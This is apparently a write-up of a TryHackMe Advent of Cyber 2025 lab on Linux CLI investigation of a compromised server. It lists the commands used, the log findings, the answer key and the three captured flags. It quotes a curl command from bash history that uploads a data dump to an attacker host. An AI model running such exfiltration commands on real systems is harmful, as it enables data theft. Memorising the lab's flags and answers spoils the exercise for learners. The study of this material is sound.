![Uploading image.png…]()

# 🛡️ TryHackMe – Advent of Cyber 2025  
## Day 1 — Linux CLI: Shells Bells  
*A full walkthrough including commands, findings, answers, and captured flags.*



## ❄️ 1. Challenge Overview
A compromised Linux server contains hidden files, suspicious login attempts, and a malicious script. The objective is to use the Linux CLI to investigate the machine, uncover IOCs (Indicators of Compromise), and recover security flags.



## 🧭 2. Environment Setup
- CLI-only environment (no GUI)  
- Initial user: `mcskidy`  
- Escalated user: `root`  

**Tools used:**
`ls`, `cd`, `cat`, `find`, `history`, `grep`, `pwd`



## 🗂️ 3. Filesystem Exploration

**Commands executed:**
```bash
echo "Hello World!"
ls
cat README.txt
pwd
Findings:

The README warns about Eggsploits.

A hidden security guide also exists.

🔍 4. Locating Hidden Files
bash
Copy code
cd Guides
ls -la
cat .guide.txt
Discovery:
`THM{learning-linux-cli}`
➡️ This is Key 1

Additionally, the guide instructs us to look into logs and egg-related artifacts.

📁 5. Log Analysis (Failed Login Attempts)
bash
Copy code
cd /var/log
grep "Failed password" auth.log
Findings:

Repeated login failures on the socmas user

Source host: eggbox-196.hopsec.thm

Interpretation:
Possible brute-force activity from HopSec infrastructure.

🥚 6. Searching for Malicious Files
bash
Copy code
find /home/socmas -name *egg*
Result:
/home/socmas/2025/eggstrike.sh

Then we inspect:

bash
Copy code
cd /home/socmas/2025
cat eggstrike.sh
Flag found:
`THM{sir-carrotbane-attacks}`
➡️ This is Key 2

Script behavior:

Dumps wishlist

Deletes wishlist

Replaces “Christmas” with “EASTMAS”

➡️ Indicates targeted sabotage + data exfiltration.

🔐 7. Privilege Escalation to Root
Attempting access:

bash
Copy code
cat /etc/shadow
Denied → requires elevated privileges.

We escalate:

bash
Copy code
sudo su
whoami
Result: root access granted

🧾 8. Bash History Analysis
We investigate prior commands:

bash
Copy code
history
and:

bash
Copy code
cat /root/.bash_history
Exfiltration command identified:

bash
Copy code
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
And a final flag appears:
`THM{until-we-meet-again}`
➡️ This is Key 3

🧠 9. Task Question Answers
Question	Answer
Which CLI command lists a directory?	ls
What flag was in McSkidy’s guide?	THM{learning-linux-cli}
Which command filtered failed logins?	grep
What flag was inside the Eggstrike script?	THM{sir-carrotbane-attacks}
Which command switches to root?	sudo su
Final flag from Bash history?	THM{until-we-meet-again}

🧩 10. Flags Summary (Your 3 Keys)
Key	Flag
Key 1	THM{learning-linux-cli}
Key 2	THM{sir-carrotbane-attacks}
Key 3	THM{until-we-meet-again}

🏁 11. Final Assessment
This challenge teaches:

Linux terminal navigation

Locating hidden files

Analyzing authentication logs

Inspecting malicious scripts

Privilege escalation

Investigating shell history for IOCs

